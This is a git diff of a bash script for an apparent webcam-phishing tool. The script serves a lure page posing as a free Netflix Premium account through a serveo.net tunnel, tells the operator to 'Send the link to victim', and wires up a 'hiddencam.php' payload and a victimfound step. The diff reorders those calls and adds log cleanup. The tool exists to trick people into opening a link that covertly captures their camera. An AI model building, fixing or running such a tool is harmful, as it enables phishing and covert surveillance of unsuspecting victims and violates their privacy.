@@ -28,6 +28,13 @@ command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Instal
 command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
 command -v python2 > /dev/null 2>&1 || { echo >&2 "Python2 is not installed ! Install it"; exit 1; }
 
+if [[ -e .cam.log ]]; then
+rm -rf .cam.log
+fi
+
+if [[ -e .servlink ]]; then
+rm -rf .servlink
+fi
 }
 banner() {
 
@@ -45,9 +52,7 @@ printf " \n"
 }
 menu() {
 
-if [[ -e .servlink ]]; then
-rm -rf .servlink
-fi
+
 
 printf " \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf " \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Serveo\e[0m\n"
@@ -188,9 +193,6 @@ subdomain="${subdomain:-${default_subdomain}}"
 fi
 
 start_serveo2
-initialize_serveo
-victimfound
-
 }
 start_serveo2() {
 
@@ -213,10 +215,11 @@ fuser -k $port/tcp > /dev/null 2>&1
 php -S localhost:$port > /dev/null 2>&1 &
 sleep 3
 serv_link=$(grep -o "https://[0-9a-z]*\.serveo.net" .servlink)
+banner
 printf "\e[0m\n"
 printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $serv_link
 printf "\n"
-
+initialize_serveo
 }
 initialize_serveo() {
 
@@ -224,6 +227,7 @@ serveolink=$(grep -o "https://[0-9a-z]*\.serveo.net" .servlink)
 sed 's+forwarding_link+'$serveolink'+g' .tahmidrayat.iso > .NetFlix-Premium-Account.html
 sed 's+forwarding_link+'$serveolink'+g' .hiddencam.php > index.php
 
+victimfound
 }
 banner
 req
